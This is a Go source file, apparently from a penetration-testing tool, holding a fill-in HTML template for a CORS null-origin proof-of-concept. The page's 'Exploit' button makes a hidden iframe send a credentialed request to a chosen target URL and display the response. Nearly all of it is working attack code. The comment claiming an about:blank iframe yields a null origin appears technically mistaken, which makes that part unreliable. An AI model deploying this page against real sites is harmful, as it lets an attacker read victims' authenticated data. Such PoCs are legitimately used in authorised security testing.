package templates

var (
	POCNull = `<!DOCTYPE html>
	<html>
	<head>
		<title>CORS Null Origin PoC</title>
		<script>
			function cors() {
				var iframe = document.createElement('iframe');
				iframe.style.display = 'none';  // Hide the iframe for the exploit to be less noticeable.
	
				// When the iframe loads, execute the XMLHttpRequest inside it
				iframe.onload = function() {
					var doc = iframe.contentDocument || iframe.contentWindow.document;
					var xhttp = new XMLHttpRequest();
					xhttp.onreadystatechange = function() {
						if (this.readyState == 4 && this.status == 200) {
							alert('Response received: ' + this.responseText);
						}
					};
	
					// Open the request
					xhttp.open('{{ .Method }}', '{{ .TargetURL }}', true);
					xhttp.withCredentials = true;  // Important for credentials to be included in CORS requests
	
					// Check for additional headers
					{{ if .SetRequestHeader }}
					var headerParts = '{{ .SetRequestHeader }}'.split(':');
					if (headerParts.length === 2) {
						xhttp.setRequestHeader(headerParts[0].trim(), headerParts[1].trim());
					}
					{{ end }}
	
					// Send request with or without parameters based on the method
					{{ if eq .Method "POST" }}
					xhttp.send('{{ .Params }}');
					{{ else }}
					xhttp.send();
					{{ end }}
				};
	
				// Set iframe src to "about:blank" to simulate a null origin
				iframe.src = "about:blank";
				document.body.appendChild(iframe);
			}
		</script>
	</head>
	<body>
		<center>
			<h2>CORS Null Origin PoC Generator</h2>
			<h3>Click to Exploit</h3>
			<button type="button" onclick="cors()">Exploit</button>
		</center>
	</body>
	</html>
	`
)
